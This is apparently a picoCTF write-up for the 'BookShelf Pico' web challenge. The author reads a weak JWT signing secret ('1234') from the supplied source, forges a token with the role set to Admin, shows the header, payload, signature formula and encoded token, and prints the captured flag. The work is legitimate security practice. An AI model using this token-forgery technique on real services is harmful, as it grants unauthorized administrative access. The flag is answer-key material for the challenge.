## Objetivo
BookShelf Pico, my premium online book-reading service.I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!Here are the credentials to get you started:

- Username: "user"
- Password: "user"

Source code can be downloaded [here](https://artifacts.picoctf.net/c/479/bookshelf-pico.zip).Website can be accessed [here!](http://saturn.picoctf.net:60968/).
## Solución
header:
```bash
{
  "typ": "JWT",
  "alg": "HS256"
}
```
payload:
```bash
{
  "role": "Admin",
  "iss": "bookshelf",
  "exp": 1730604863,
  "iat": 1730000063,
  "userId": 2,
  "email": "admin"
}
```
verify signature:
```bash
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  1234
)
```
Encoded:
```bash
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3MzA2MDQ4NjMsImlhdCI6MTczMDAwMDA2MywidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.Fj3JU-OdArC1S3r9PVhW_f4modEQ66gV8AARQN14T1o
```
## Notas Adicionales
En este reto web nos dan el codigo de la pagina y ademas la pagina en si abriendo una instancia, dentro de el codigo de la pagina decia que la signature era `1234`.
asi que lo que hice fue modificar el token pero cambiando el email y el role a `Admin` y `admin` respectivamente, ademas de la firma a `1234`.
recargando la pagina y abriendo el libro flag obtenemos la flag:
```bash
Great job! Here’s your flag:picoCTF{w34k_jwt_n0t_g00d_d7c2e335}
```

### Referencias
jason web token decoder
https://jwt.io/